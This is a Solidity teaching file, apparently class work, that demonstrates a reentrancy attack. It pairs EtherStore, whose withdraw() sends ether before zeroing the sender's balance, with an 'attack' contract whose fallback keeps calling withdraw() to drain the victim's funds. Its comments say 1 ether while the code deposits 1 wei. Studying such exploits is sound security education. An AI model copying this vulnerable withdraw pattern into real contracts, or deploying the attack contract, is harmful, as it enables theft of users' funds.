// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EtherStore {
//Class Work Create a mapping whose key is address and value is uint and the name is balances. Make it public.

    mapping(address => uint) public balances; //to track the number of addresses since several addresses exist

    //Class Work Create a function to deposit ether.
    /*created a function to deposit ether. Made the visibility public and we make it payable
    so the function will be able to receive ether.
    Ater depositing, we increment the balance of the person calling this function i.e msg.sender by the amount deposited.
    */

    function deposit() public payable {
        //balances[msg.sender] = balances[msg.sender] + msg.value;
        balances[msg.sender] += msg.value;
    }
    //Class Work Create a function for users to withdraw.
    /*created a function withdraw which we made public. We created a local variable called bal to hold the balance of the person calling 
    this funtion 
    then we put a check that the balance of that person should be greater that zero i.e have at least one ether, if not throw an error. 
    after which we use the call method of sending ether. and the value hold the bal declared up there
    so after the call has been made decrement the balance of the person calling this function. but we set the balance 
    to zero because we assumed that the person calling this function withdraw everything so we set the balance to zero.
    */
    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);
    
        (bool sent, ) = msg.sender.call{value: bal}("");  
        require(sent, "Failed to send Ether"); 
        balances[msg.sender] =  0; 
    }
    //function getBalance that returns the total balance of ether in this contract
    function getBalance() public view returns(uint) {
        return address(this).balance; //gets the balance of this contract
    }      
}
/* because the attacker will need to interact i.e have a direct interaction with the victim's contract to carry out this evil act,
we created a state variable etherStore with a small e, and we referenced the name of the victim's contract so we will be able 
to interact with the everything we have in
the victim's contract.
After which we created a constructor to help initialize this state variable(etherstore). So the constructor takes 
in the address of the etherstore as input from the 
frontend and setting the value of etherstore to the address coming from the frontend wrt the name of the contract we want to attack.
i.e setting the state variable(etherstore) to contract address we want to attack (Etherstore). 
*/
contract attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    /*
    This is the main function the attacker uses so an if statement is created that so far the balance  of  
    the address of the victim is equal to or greater than 1 ether, it should keep calling the withdrawal function in etherstore.
    */
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

// this function carries out the attack. It requires that the msg.value must be equal to or greater than 1 ether
// call the deposit function of etherscore with 1 ether. Then call the withdrwal function in etherstore as well.
    function Attack() external payable {
        require(msg.value >= 1);
        etherStore.deposit{value: 1}();
        etherStore.withdraw();
    }

    function getBalance() public view returns(uint) {
        return address(this).balance; //gets the balance of this contract
    }  
      
}
